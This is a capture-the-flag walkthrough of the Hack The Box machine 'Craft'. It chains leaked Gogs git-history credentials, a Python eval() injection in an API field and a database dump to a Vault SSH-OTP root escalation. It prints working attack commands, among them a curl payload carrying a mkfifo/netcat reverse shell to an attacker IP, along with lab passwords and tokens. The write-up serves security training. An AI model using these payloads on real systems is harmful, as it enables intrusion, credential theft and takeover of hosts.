

**Box:** Craft · **IP:** 10.10.10.110 · **Subdomains:** `api.craft.htb`, `gogs.craft.htb`, `vault.craft.htb`

**Full chain (one line):**

Gogs source + **git history** leaks `dinesh : 4aUh0A8PbVJxgd` → Craft API login returns a **JWT** → the `abv` field runs `eval()` → **RCE** as root in the API **container** → read `settings.py` (DB creds) + reuse `dbtest.py` to dump the **user table** → `gilfoyle`'s password → Gogs as gilfoyle → private **craft-infra** repo has an **SSH key** (passphrase = his DB password) → ssh = **user** → **HashiCorp Vault SSH OTP** role `root_otp` → **root**.

> This box is three web services that feed each other: **Gogs** (source control — read the code and its history), the **Craft API** (the vulnerable app), and **Vault** (the root pivot). The skill it teaches: *read the source, find the dangerous line, then follow the secrets.*

---

## Phase 1 — Recon

The landing page links to `https://api.craft.htb/api/` and `https://gogs.craft.htb/`. nmap:

- **443** HTTPS (the app), **6022** "Golang x/crypto/ssh" (that's **Gogs' built-in SSH**, not a normal shell), **22** SSH (the real one).

Add the hosts and fuzz for more vhosts (the default list missed one — use a bigger list):

```bash
echo '10.10.10.110 craft.htb api.craft.htb gogs.craft.htb vault.craft.htb' | sudo tee -a /etc/hosts

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.10.10.110 -H 'Host: FUZZ.craft.htb' -mc 200 -s
```

→ reveals **`vault.craft.htb`** (you need the larger wordlist to catch it).

### The three services

- **`api.craft.htb`** — a Swagger-documented "Craft API" for brews. Endpoints: `GET/POST /brew/`, `GET /brew/{id}`, `GET /auth/login` (returns a token), `GET /auth/check`. `feroxbuster` confirms `auth/login` (401) and `auth/check` (403).

- **`gogs.craft.htb`** — a self-hosted Git service (like GitHub). Has the **craft-api** repo and an **issue**. This is where you read the app's source.

- **`vault.craft.htb`** — **HashiCorp Vault** (`/v1/sys/health` shows `version 0.11.1`, initialized, unsealed). Park it — it's the root pivot.

---

## Phase 2 — Gogs: read the code and its history

Open the **craft-api** repo on Gogs. The key lesson here: **check git history and issues, not just the current files.**

- The **issue** shows a developer testing the API with a brew that has an **ABV > 1** (alcohol fraction > 100%), and the code rejecting it — which tells you the app **validates `abv` by evaluating it**.

- In `craft_api/api/brew/endpoints/brew.py` the validation is:

```python
if eval('%s > 1' % request.json['abv']) is True:
    abort(400, 'ABV must be a decimal value less than 1.0')
```

**`eval()` on attacker input = Python code execution.** The `abv` value is dropped straight into `eval(...)`, so anything you put there runs. The developer is using Python’s `eval()` to check if the `ABV` value is greater than 1. They're treating it like a math check, but `eval()` executes any arbitrary Python code passed to it, so instead of sending it a number, we can try to execute code in it.

Also the codes import settings.py but this file was found nowhere in that repo.

### Find credentials in git history (the "check all histories" lesson)

`tests/tests.py` in the current tree has no creds — but its **commit history** does. Open the file's **History** in Gogs, view an earlier commit, and you get:

```python
auth = ('dinesh', '4aUh0A8PbVJxgd')
```

**Lesson:** secrets get committed then "removed" in a later commit — but git keeps every version. Always browse **file history / old commits / closed issues**, not just `HEAD`.

---

## Phase 3 — API token + eval → RCE

### The token flow

`GET /auth/login` uses **HTTP Basic auth** and returns a **JWT**. You then send that token in the **`X-CRAFT-API-TOKEN`** header (as per their github's tests) on later requests.

>I noticed the first token doesnt work after some times, maybe it gets expired. The JWT **expires in ~5 minutes**. Always fetch a fresh token right before you use it.

Get a token:

```bash
curl -k -X GET "https://api.craft.htb/api/auth/login" \  
-u "dinesh:4aUh0A8PbVJxgd"


#{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<SNIP>
```

### Trigger the eval → reverse shell

`POST /brew/` runs `eval('<abv> > 1')`,  So put a Python payload in `abv`. Start a listener, then fire the request (lands as **root inside the API container**, cwd `/opt/app`):

```bash
nc -lnvp 443
```
```bash
curl -s -k -X POST "https://api.craft.htb/api/brew/" -H "Content-Type: application/json" -H "X-CRAFT-API-TOKEN: <your_jwt>" -d '{"id":0,"brewer":"x","name":"x","style":"x","abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f\")"}'
```

(replace `10.10.14.8` with your tun0 IP). `__import__("os").system(...)` is how you call `os.system` inline inside `eval` without an import statement. 

The `curl -s`  telling the command to not show the progress bar with silent mode, `-k` option ignores self-signed certificates in HTTPS. Most of the HTB boxes use this kind of certificate, and we are specifying the HTTP method with `-x GET`, `-d <SNIP>`  specifying the POST request data to send to the server.

> **"Shell as root" — but it's a container.** You're root in a **Docker container running the API**, not on the host. The container is a stepping stone: its files hold the DB creds and it can reach the internal MySQL.

---

## Phase 4 — Inside the container: dump the database

Two files matter in `/opt/app`:

- **`craft_api/settings.py`** — the **MySQL credentials** and the JWT signing secret.

```bash
/opt/app/craft_api # cat settings.py  
  
<SNIP>  
  
# database  
MYSQL_DATABASE_USER = 'craft'  
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'  
MYSQL_DATABASE_DB = 'craft'  
MYSQL_DATABASE_HOST = 'db'  
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

We can see credentials for the database user. Now that we’ve found database credentials, let’s see if there is any database service we can use these credentials for. We can use this command to check for active network connections in the local system `netstat -tunap` and check for `Established` with two ip's from local to foreign host.

##### Option 1:

to make the connection with mysql, you can do it manually by:

```bash
python3 -c 'import pymysql; conn = pymysql.connect(host="foreign_host_ip", user="craft", password="qLGockJ6G2J75O", db="craft"); cursor = conn.cursor(); cursor.execute("show tables;"); print(cursor.fetchall())'


python3 -c 'import pymysql; conn = pymysql.connect(host="172.20.0.4", user="craft", password="qLGockJ6G2J75O", db="craft"); cursor = conn.cursor(); cursor.execute("select * from user;"); print(cursor.fetchall())'

# dump from tables

```

##### Option 2:

**`dbtest.py`** — a ready-made script that already **connects to the DB** using those settings. Don't rebuild the connection — reuse it. Copy it and tweak it to run an arbitrary query:

```bash
cd /opt/app

cp dbtest.py .dbtest.py

vi .dbtest.py
# edit .dbtest.py: add `import sys`, set `sql = sys.argv[1]`, and switch the cursor to fetchall() + print

python .dbtest.py "SELECT * FROM user"
```

→ the **user table**: `dinesh`, `ebachman`, **`gilfoyle`**, each with a password. Grab **gilfoyle**'s.

> **Why reuse `dbtest.py`:** the DB is only reachable from inside the container and the creds/host are already wired into that script. Modifying it is faster and less error-prone than writing a fresh MySQL client by hand.

---

## Phase 5 — gilfoyle → user (Gogs private repo → SSH key)

gilfoyle's DB password is **reused** for his **Gogs** account. Log into Gogs as `gilfoyle` → he owns a **private** repo **`craft-infra`**, which contains an **SSH key pair** under `.ssh/` plus Vault config.

Copy and Save the private key with no extra spaces and connect:

```bash
chmod 600 id_rsa_gilfoyle
ssh -i id_rsa_gilfoyle gilfoyle@10.10.10.110
```

The key is **passphrase-protected**, and the passphrase is **gilfoyle's DB password**  `ZEU3N8WNM2rh4T` (password reuse again — DB → Gogs → key passphrase). → **user.txt** in his home.

---

## Phase 6 — Vault SSH OTP → root

### What HashiCorp Vault actually is (the role it plays here)

Vault is a **secrets manager** — think of it as a locked safe that services use to store passwords, API keys, and certs. But it does one extra clever thing: it has **secrets engines** that can *generate temporary credentials on demand* instead of only storing static ones.

One of those engines is the **SSH engine**. It can be configured so that an authorized client asks Vault *"give me a way to SSH into this box as root,"* and Vault hands back a **one-time password (OTP)** — valid for a single login, then dead.

On Craft, the admin set this up as a convenience: instead of sharing root's real SSH password, authorized people ask Vault for a throwaway root login. **That legitimate feature *is* the privesc** — gilfoyle is an authorized Vault client, so you just ask Vault for root. No exploit involved.

### How I knew to go down this path (the breadcrumbs)

This isn't magic — two things pointed straight here:

1. **The `craft-infra` repo** (from Phase 5) contained `vault/secrets.sh`, a setup script that literally runs `vault write ssh/roles/root_otp key_type=otp default_user=root ...`. That script is the blueprint: it tells you a role named `root_otp` exists, it's an OTP role, and its default user is **root**. A giant arrow pointing at root.
2. **`ls -la` in gilfoyle's home** showed a `.vault-token` file. When you see a file you don't recognize, you research it — `.vault-token` is the standard location where the Vault CLI caches your login token. Finding one means **this user is already authenticated to Vault.**

So the reasoning chain is: repo shows Vault manages SSH as root → home dir shows gilfoyle has a live Vault token → therefore gilfoyle can probably ask Vault for a root login.

### The two things the Vault CLI always needs

Every `vault` command is authenticated, so the CLI needs to know:

- **`VAULT_ADDR`** — *where* the Vault server is (its URL). On Craft this was already set in gilfoyle's environment (check with `env | grep VAULT`), which is why we only set the token below.
- **`VAULT_TOKEN`** — *who you are* (your auth token = proof of identity).

These two aren't guessed — they're Vault's documented environment variables. You'd find them with `vault -h` / `vault read -h` or the Vault docs when you hit an unknown tool. This is the "research any unknown tool you encounter" habit.

### Step 1 — Authenticate as gilfoyle

You *found* gilfoyle's token sitting in `.vault-token`. Exporting it as `VAULT_TOKEN` tells the CLI *"use this token to authenticate me as gilfoyle."* Without a token, every `vault` command fails with a permission error.

```bash
cat .vault-token
```
```bash
export VAULT_TOKEN=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

> Why `export`? It sets the variable in the environment so the `vault` CLI (a separate process) can read it. The CLI *also* auto-reads `~/.vault-token` if no env var is set, so it might've worked without this — but exporting is the explicit, documented, guaranteed way, removing any ambiguity about which token is used.

### Step 2 — See what this Vault can do

```bash
vault secrets list
```

This lists the **enabled secrets engines** — what this Vault instance is capable of. The output showed:

| Path | Type | Meaning |
|------|------|---------|
| `cubbyhole/` | cubbyhole | per-token scratch storage |
| `identity/` | identity | identity store |
| `secret/` | kv | stored key/value secrets |
| **`ssh/`** | **ssh** | **the SSH engine — can generate SSH credentials** |
| `sys/` | system | Vault's own control endpoints |

The line that matters is **`ssh/`**. Seeing an SSH engine mounted confirms *"this Vault can hand out SSH logins."* That's the cue to look at what roles it offers.

### Step 3 — Confirm the role grants root

```bash
vault read ssh/roles/root_otp
```

This reads the config of the `root_otp` role (the one `secrets.sh` created). The output confirmed the dangerous bits:

- `default_user = root` → logs you in as **root**
- `cidr_list = 0.0.0.0/0` → allowed from **any IP**, no restriction (this is the misconfiguration)
- `key_type = otp` → generates one-time passwords
- `port = 22`

### Step 4 — Request an OTP and log in as root

```bash
vault ssh -mode=otp -role=root_otp root@127.0.0.1
```

Vault generates a one-time password, SSH connects to `root@localhost`, you paste the OTP at the `Password:` prompt → **root shell**, `root.txt` in `/root`. 👑

> **Why `127.0.0.1` (localhost)?** You're already SSH'd into the Craft box as gilfoyle, and the machine you want root on is *this same box*. `127.0.0.1` means "the local machine I'm sitting on," so you're telling Vault to generate an OTP for logging into the local SSH daemon (port 22) as root. You're not pivoting to a remote host — Vault, the SSH service, and your target (root on Craft) are all on the one box, so you just loop back to yourself. The box's own LAN IP (e.g. `172.x.x.x`) would also work, but localhost is the simplest and most reliable since you're already on it. The role's `cidr_list = 0.0.0.0/0` is what allows the OTP to be issued for *any* address, localhost included.

> **What just happened:** Vault's SSH-OTP engine is *designed* to hand out short-lived root logins to authorized clients. gilfoyle is authorized, so you simply ask Vault for a root OTP and use it — no exploit, just abusing legitimate access you inherited.

### Why it worked despite SSH password auth being off

Even though SSH was configured to deny standard password authentication (as we identified from the earlier key-passphrase step), Vault SSH OTP works through **PAM** (Pluggable Authentication Modules) — a separate authentication mechanism that operates independently from standard SSH password auth, which is why it still worked.

This was possible due to a **misconfiguration** — the role allowed any authenticated Vault user to generate root credentials with no IP restrictions (`cidr_list = 0.0.0.0/0`), essentially giving gilfoyle a path straight to root.

The privesc technique used here — HashiCorp Vault SSH OTP — is **not covered in the HTB Academy CPTS modules**. The *mindset* behind it is, though: always enumerate files in the user's home directory, understand what unfamiliar files and environment variables point to, and research any unknown tools you encounter. The Linux Privilege Escalation module teaches this general enumeration approach, even if Vault itself isn't mentioned.

[HTB Craft Machine Walkthrough Easy HackTheBox Guide for Beginners | by SeverSerenity | Medium](https://medium.com/@SeverSerenity/htb-craft-machine-walkthrough-easy-hackthebox-guide-for-beginners-3f8763cd3ebb) 



---

## Full chain (one glance)

```
Gogs craft-api repo → eval() in /brew abv  +  git history → dinesh:4aUh0A8PbVJxgd
  │ GET /auth/login → JWT (X-CRAFT-API-TOKEN, ~5 min)
POST /brew abv = __import__('os').system(revshell)  → RCE as root in API container
  │ /opt/app/settings.py (DB creds) + reuse dbtest.py
dump user table → gilfoyle's password
  │ password reuse → Gogs (gilfoyle) → private craft-infra repo
SSH key (passphrase = gilfoyle DB pw) → ssh gilfoyle  → USER
  │ Vault SSH secrets engine, role root_otp
vault ssh -mode=otp -role=root_otp root@127.0.0.1  → ROOT  👑
```

## Takeaways

1. **Read the source and its history.** The vuln (`eval` on `abv`) was visible in the repo, and the creds were in an **old commit** of `tests.py`. Check history, issues, and closed PRs — not just `HEAD`.
2. **`eval()`/`exec()` on request data = RCE.** `__import__("os").system(...)` runs OS commands inline inside an `eval`.
3. **Short-lived API tokens** — fetch a fresh JWT right before each call; a "broken" request is often just an expired token.
4. **RCE in a container ≠ host.** Treat it as a pivot: harvest its config (DB creds, secrets) and reach internal services from it.
5. **Reuse the app's own DB script** (`dbtest.py`) instead of rebuilding a connection — the creds and host are already wired in.
6. **Password reuse is the connective tissue here:** DB password → Gogs login → SSH key passphrase.
7. **HashiCorp Vault's SSH engine can *be* the privesc** — an authorized user can request a `root_otp` and SSH in as root. Learn `vault read ssh/roles/*` and `vault ssh -mode=otp`.
